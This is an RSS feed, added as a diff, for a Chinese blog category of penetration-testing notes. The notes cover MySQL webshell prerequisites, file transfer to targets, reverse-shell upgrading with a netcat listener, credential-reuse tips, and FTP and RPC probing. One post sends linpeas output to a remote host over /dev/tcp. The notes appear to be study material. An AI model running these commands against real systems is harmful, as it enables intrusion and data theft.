@@ -1,0 +1,220 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>渗透技巧 on HELLO WORLD</title>
+    <link>http://localhost:1313/categories/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/</link>
+    <description>Recent content from HELLO WORLD</description>
+    <generator>Hugo</generator>
+    <language>zh-cn</language>
+    
+    <managingEditor>xxx@example.com (L)</managingEditor>
+    <webMaster>xxx@example.com (L)</webMaster>
+    
+    <copyright>本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！</copyright>
+    
+    <lastBuildDate>Tue, 20 Feb 2024 12:10:11 +0000</lastBuildDate>
+    
+    
+    <atom:link href="http://localhost:1313/categories/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/index.xml" rel="self" type="application/rss&#43;xml" />
+    
+
+    
+    
+
+    <item>
+      <title>mysql写入webshell方法</title>
+      <link>http://localhost:1313/post/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/mysql%E4%B8%AD%E5%86%99%E5%85%A5wenshell%E6%96%B9%E6%B3%95/</link>
+      <pubDate>Tue, 20 Feb 2024 12:10:11 &#43;0000</pubDate>
+      <author>xxx@example.com (L)</author>
+      <guid>http://localhost:1313/post/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/mysql%E4%B8%AD%E5%86%99%E5%85%A5wenshell%E6%96%B9%E6%B3%95/</guid>
+      <description>
+        <![CDATA[<h1>mysql写入webshell方法</h1><p>作者：L（xxx@example.com）</p>
+        
+          <h2 id="写入前提">
+<a class="header-anchor" href="#%e5%86%99%e5%85%a5%e5%89%8d%e6%8f%90"></a>
+写入前提
+</h2><p>mysql服务一般是由mysql账户运行的，因此该目录要求该账户具有写权限。</p>
+<p>secure_file_priv 参数的作用是限制数据导入和导出操作，只有当值为空，或有路径时，才能写入。</p>
+        
+        <hr><p>本文2024-02-20首发于<a href='http://localhost:1313/'>HELLO WORLD</a>，最后修改于2024-02-20</p>]]>
+      </description>
+      
+        <category>渗透技巧</category>
+      
+    </item>
+    
+    
+
+    <item>
+      <title>与目标机进行文件传输</title>
+      <link>http://localhost:1313/post/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/%E4%B8%8E%E7%9B%AE%E6%A0%87%E6%9C%BA%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/</link>
+      <pubDate>Sun, 28 Jan 2024 17:54:19 &#43;0000</pubDate>
+      <author>xxx@example.com (L)</author>
+      <guid>http://localhost:1313/post/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/%E4%B8%8E%E7%9B%AE%E6%A0%87%E6%9C%BA%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/</guid>
+      <description>
+        <![CDATA[<h1>与目标机进行文件传输</h1><p>作者：L（xxx@example.com）</p>
+        
+          <h3 id="使用wget进行传输">
+<a class="header-anchor" href="#%e4%bd%bf%e7%94%a8wget%e8%bf%9b%e8%a1%8c%e4%bc%a0%e8%be%93"></a>
+使用wget进行传输
+</h3><p>1.在本机建立http服务</p>
+<p>2.在目标机执行 wget 或curl 获取资源。</p>
+<h3 id="使用nc传输">
+<a class="header-anchor" href="#%e4%bd%bf%e7%94%a8nc%e4%bc%a0%e8%be%93"></a>
+使用nc传输
+</h3><p>1.现在本机做好端口监听，然后将需传输文件a.txt进行输入重定向。</p>
+        
+        <hr><p>本文2024-01-28首发于<a href='http://localhost:1313/'>HELLO WORLD</a>，最后修改于2024-01-28</p>]]>
+      </description>
+      
+        <category>渗透技巧</category>
+      
+    </item>
+    
+    
+
+    <item>
+      <title>提高反弹shell交互性</title>
+      <link>http://localhost:1313/post/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/%E6%8F%90%E9%AB%98%E5%8F%8D%E5%BC%B9shell%E4%BA%A4%E4%BA%92%E6%80%A7/</link>
+      <pubDate>Sun, 28 Jan 2024 17:54:19 &#43;0000</pubDate>
+      <author>xxx@example.com (L)</author>
+      <guid>http://localhost:1313/post/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/%E6%8F%90%E9%AB%98%E5%8F%8D%E5%BC%B9shell%E4%BA%A4%E4%BA%92%E6%80%A7/</guid>
+      <description>
+        <![CDATA[<h1>提高反弹shell交互性</h1><p>作者：L（xxx@example.com）</p>
+        
+          <h3 id="使用python提升shell交互">
+<a class="header-anchor" href="#%e4%bd%bf%e7%94%a8python%e6%8f%90%e5%8d%87shell%e4%ba%a4%e4%ba%92"></a>
+使用python提升shell交互
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Python -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></div><h3 id="重新输出shell">
+<a class="header-anchor" href="#%e9%87%8d%e6%96%b0%e8%be%93%e5%87%bashell"></a>
+重新输出shell
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">获得初始shell ctrl+z 挂在后台
+</span></span><span class="line"><span class="cl">然后输入 stty raw -echo<span class="p">;</span><span class="nb">fg</span>   
+</span></span><span class="line"><span class="cl"><span class="c1">## 这样再按ctrl+c时shell不会中断</span>
+</span></span></code></pre></div><h3 id="添加环境变量">
+<a class="header-anchor" href="#%e6%b7%bb%e5%8a%a0%e7%8e%af%e5%a2%83%e5%8f%98%e9%87%8f"></a>
+添加环境变量
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm-color
+</span></span><span class="line"><span class="cl"><span class="c1">## 可支持更多命令</span>
+</span></span></code></pre></div><h3 id="使用rlwrap进行监听">
+<a class="header-anchor" href="#%e4%bd%bf%e7%94%a8rlwrap%e8%bf%9b%e8%a1%8c%e7%9b%91%e5%90%ac"></a>
+使用rlwrap进行监听
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">rlwrap nc -lvvp <span class="m">666</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## 可识别上下左右</span>
+</span></span></code></pre></div>
+        
+        <hr><p>本文2024-01-28首发于<a href='http://localhost:1313/'>HELLO WORLD</a>，最后修改于2024-01-28</p>]]>
+      </description>
+      
+        <category>渗透技巧</category>
+      
+    </item>
+    
+    
+
+    <item>
+      <title>其他技巧</title>
+      <link>http://localhost:1313/post/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7/</link>
+      <pubDate>Sun, 28 Jan 2024 17:54:19 &#43;0000</pubDate>
+      <author>xxx@example.com (L)</author>
+      <guid>http://localhost:1313/post/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7/</guid>
+      <description>
+        <![CDATA[<h1>其他技巧</h1><p>作者：L（xxx@example.com）</p>
+        
+          <ul>
+<li>
+<p>当get请求传参时，无法得出想要的结果，可以对传参进行url编码。</p>
+</li>
+<li>
+<p>碰到cms先去找管理路径，尝试默认账户登录，其次去找通用漏洞。</p>
+</li>
+<li>
+<p>从网站配置获取的数据库密码还是从其他地方获取的账户密码，要进行统一收集，因为存在密码账户重复使用的情况。</p>
+        
+        <hr><p>本文2024-01-28首发于<a href='http://localhost:1313/'>HELLO WORLD</a>，最后修改于2024-01-28</p>]]>
+      </description>
+      
+        <category>渗透技巧</category>
+      
+    </item>
+    
+    
+
+    <item>
+      <title>将靶机执行结果传回至本机</title>
+      <link>http://localhost:1313/post/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/%E5%B0%86%E9%9D%B6%E6%9C%BA%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E4%BC%A0%E5%9B%9E%E8%87%B3%E6%9C%AC%E6%9C%BA/</link>
+      <pubDate>Sun, 28 Jan 2024 17:54:19 &#43;0000</pubDate>
+      <author>xxx@example.com (L)</author>
+      <guid>http://localhost:1313/post/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/%E5%B0%86%E9%9D%B6%E6%9C%BA%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E4%BC%A0%E5%9B%9E%E8%87%B3%E6%9C%AC%E6%9C%BA/</guid>
+      <description>
+        <![CDATA[<h1>将靶机执行结果传回至本机</h1><p>作者：L（xxx@example.com）</p>
+        
+          <p>1.现在本机做好端口监听</p>
+<p><img src="./../../images/image-20240128205726924.png" alt="image-20240128205726924"></p>
+<p>Tee 命令表示创建分支，将输出结果存到a.txt中</p>
+<p>2.在目标机器执行程序</p>
+<p><img src="./../../images/image-20240128205758726.png" alt="image-20240128205758726"></p>
+<p>或</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111
+</span></span></code></pre></div><p>如果输出的a.txt文件有可能存在乱起八糟的符号。</p>
+        
+        <hr><p>本文2024-01-28首发于<a href='http://localhost:1313/'>HELLO WORLD</a>，最后修改于2024-01-28</p>]]>
+      </description>
+      
+        <category>渗透技巧</category>
+      
+    </item>
+    
+    
+
+    <item>
+      <title>RPC端口测试</title>
+      <link>http://localhost:1313/post/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/rpc%E7%AB%AF%E5%8F%A3%E6%B5%8B%E8%AF%95/</link>
+      <pubDate>Sun, 28 Jan 2024 17:54:19 &#43;0000</pubDate>
+      <author>xxx@example.com (L)</author>
+      <guid>http://localhost:1313/post/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/rpc%E7%AB%AF%E5%8F%A3%E6%B5%8B%E8%AF%95/</guid>
+      <description>
+        <![CDATA[<h1>RPC端口测试</h1><p>作者：L（xxx@example.com）</p>
+        
+          <p>在kali中 默认有 rpcclient 工具 ，去连接RPC服务。</p>
+<p><img src="./../../images/image-20230820155432724.png" alt="image-20230820155432724"></p>
+<p>也可以使用python中impacket类库中的 rpcdump.py工具</p>
+<p><img src="./../../images/image-20230820160138727.png" alt="image-20230820160138727"></p>
+<p><img src="./../../images/image-20230820160222255.png" alt="image-20230820160222255"></p>
+<p>当然，你要想直接使用它，要么添加一台环境变量，要么进到对应目录下</p>
+        
+        <hr><p>本文2024-01-28首发于<a href='http://localhost:1313/'>HELLO WORLD</a>，最后修改于2024-01-28</p>]]>
+      </description>
+      
+        <category>渗透技巧</category>
+      
+    </item>
+    
+    
+
+    <item>
+      <title>FTP端口测试</title>
+      <link>http://localhost:1313/post/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/ftp%E7%AB%AF%E5%8F%A3%E6%B5%8B%E8%AF%95/</link>
+      <pubDate>Sun, 28 Jan 2024 17:54:19 &#43;0000</pubDate>
+      <author>xxx@example.com (L)</author>
+      <guid>http://localhost:1313/post/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/ftp%E7%AB%AF%E5%8F%A3%E6%B5%8B%E8%AF%95/</guid>
+      <description>
+        <![CDATA[<h1>FTP端口测试</h1><p>作者：L（xxx@example.com）</p>
+        
+          <ul>
+<li>对于FTP端口要注意测试匿名帐户登录—anonymous 。</li>
+<li>使用get 或 mget 命令下载文件到本地。</li>
+<li>并且先使用binary命令将模式切换成二进制模式，以保证下载二进制文件时，内容不会产生错误。</li>
+<li>使用pssive on 开启被动模式传输，可防止传输过程中断。</li>
+</ul>
+        
+        <hr><p>本文2024-01-28首发于<a href='http://localhost:1313/'>HELLO WORLD</a>，最后修改于2024-01-28</p>]]>
+      </description>
+      
+        <category>渗透技巧</category>
+      
+    </item>
+    
+  </channel>
+</rss>
